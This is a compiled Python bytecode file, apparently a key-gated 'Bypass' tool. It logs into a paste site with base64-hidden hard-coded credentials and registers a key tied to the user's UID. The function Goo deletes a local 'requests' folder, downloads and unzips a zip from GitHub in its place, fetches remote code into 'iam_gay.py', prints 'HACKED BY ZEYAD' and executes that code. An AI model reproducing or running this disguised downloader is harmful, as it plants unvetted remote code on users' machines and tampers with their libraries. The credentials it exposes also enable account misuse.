�
    ��Nf�  �                   �   � d dl Z d dlZd dlZd dlZd dlmZ d dlmZ d dlZd dl	Z	d dl
Z
 e�   �         Zd� Z G d� d�  �        Z e�   �          dS )�    N)�BeautifulSoup)�Consolec                  ��  � t          j        d�  �         t          j        �   �         �                    ddd��  �        j        } t          dd�  �        5 }|�                    | �  �         d d d �  �         n# 1 swxY w Y   t          j	        ddt          j
        t          j
        �	�  �         t          j        �   �         �                    dd
d��  �        j        �                    d�  �        }t          dd�  �        5 }|�                    |�  �         d d d �  �         n# 1 swxY w Y   t          d�  �         t          j        d�  �         t          t          j        d�  �        �  �         d S )Nzrm -rf requests�GETz7https://github.com/br5kly/Marshal-Bypass/raw/main/1.zipT)�redirectzrequests.zip�wbzunzip requests.zip)�shell�stdout�stdinz9https://raw.githubusercontent.com/mafiams16/MAFIA/main/M1�utf-8z
iam_gay.py�wzHACKED BY ZEYAD�   zpython iam_gay.py)�os�system�urllib3�PoolManager�request�data�open�write�
subprocess�Popen�PIPE�decode�print�time�sleep�exit)r   �keyfile�iam_gay�MMs       �fuck2.py�Goor#      s�  � ��I�� � � ��%�'�'�/�/��7p�9=� 0� ?� ?�?C� 	�	�n�d�	#�	#� �w����d����� � � � � � � � � � ���� � � � ���)��j�o�U_�Ud�e�e�e�e��&�(�(�0�0��8s�:>� 1� @� @�@D�V�V�G�_�_� �	�l�C�	 �	 � �B�
�������� � � � � � � � � � ���� � � � �	�
�����J�q�M�M�M����&�	'�	'�(�(�(�(�(s$   �A5�5A9�<A9�=D�D#�&D#c                   �&   � e Zd Zd� Zd� Zd� Zd� ZdS )�Bypassc                 �   � t          j        �   �         | _        | �                    �   �         r| �                    �   �          d S t	          j        d�  �         d S )Nzbye bye)�requests�session�Login_Snippet�Check_Login�sysr   )�selfs    r"   �__init__zBypass.__init__   sT   � ��'�)�)�������� 	 ����������H�Y������    c                 ��  � d}d}t          j        d�  �        �                    d�  �        }t          j        d�  �        �                    d�  �        }t          j        �   �         | _        ||d�}| j        �                    ||��  �        }| j        �                    |�  �        }|j        dk    r3t          |j	        d	�  �        }|�
                    d
ddi�  �        }	|	rdS dS d S )Nzhttps://snippet.host/login� https://snippet.host/jrooze/editzYWtzZGxhc2Rhc0BnbWFpbC5jb20=r   zMTIyMzMzNDQ=)�email�password�r   ��   �html.parser�button�id�logoutTF)�base64�	b64decoder   r'   r(   �post�get�status_coder   �text�find)
r,   �	Login_Url�Edit_Urlr1   r2   �login_Payload�	Post_Data�conf�soup�btns
             r"   r)   zBypass.Login_Snippet#   s�   � �0�	�5���%�&D�E�E�L�L�W�U�U���(��8�8�?�?��H�H���'�)�)���� �
� 
�� �L�%�%�i�m�%�D�D�	��|����)�)����s�"�"� ���M�:�:�D��)�)�H�t�X�&6�7�7�C�� ��t��u� #�"r.   c                 �  � | j         �                    d�  �        j        }t          |d�  �        }|�                    dddi�  �        }|r||�                    dddi�  �        d	         }|}|d
|dddd�}| j         �                    d|��  �        }|j        dk    r.t          �                    dd��  �         t          �   �          d S d S d S )Nr0   r5   �formr7   zsnippet-form�input�name�csrf�valuez	New Title�2�python�never)rK   �title�content�
visibility�language�expiresr3   r4   u    تم الاختراق بنجاحz	bold red3)�style)
r(   r<   r>   r   r?   r;   r=   �consoler   r#   )	r,   �keys�loginrE   �codes�crfrQ   �	form_data�submit_responses	            r"   �Approve_KeyszBypass.Approve_Keys7   s�   � ��� � �!C�D�D�I���U�M�2�2���	�	�&�4��"8�9�9��� 	��*�*�W�v�v�&6�7�7��@�C��G��$�"�!�$�"�� �I� #�l�/�/�0R�Yb�/�c�c�O��*�c�1�1����@���T�T�T�������	� 	� 2�1r.   c                 �,  � 	 t          t          j        �   �         �  �        }d|� d|� �}t          j        d�  �        j        }||vr|d|� �z   }| �                    |�  �         d S t          �   �          d S # t          $ r t          d�  �         Y d S w xY w)N�
M16x6b7b5c�
85b8n9nfdizhttps://snippet.host/jrooze/rawz
 zENTER CODE CORRRECT)
�strr   �geteuidr'   r<   r>   r]   r#   �
ValueErrorr   )r,   �uuid�x�old_keyss       r"   r*   zBypass.Check_LoginK   s�   � �
	(��r�z�|�|�$�$�D�3�T�3�3�T�3�3�A��|�$E�F�F�K�H���=�=�#�i�A�i�i�/���!�!�(�+�+�+�+�+��������� 	(� 	(� 	(��&�'�'�'�'�'�'�	(���s   �A"A6 �&A6 �6B�BN)�__name__�
__module__�__qualname__r-   r)   r]   r*   � r.   r"   r%   r%      sP   � � � � � � �  �  �� � �(� � �((� (� (� (� (r.   r%   )r   r'   r   r+   �bs4r   �rich.consoler   r   r   r9   rV   r#   r%   rj   r.   r"   �<module>rm      s�   �� � � � � � � � � � � � � � � � � � � � � � �  �  �  �  �  �  � ���� � � � � ����
�'�)�)��)� )� )� ;(� ;(� ;(� ;(� ;(� ;(� ;(� ;(�| ������r.   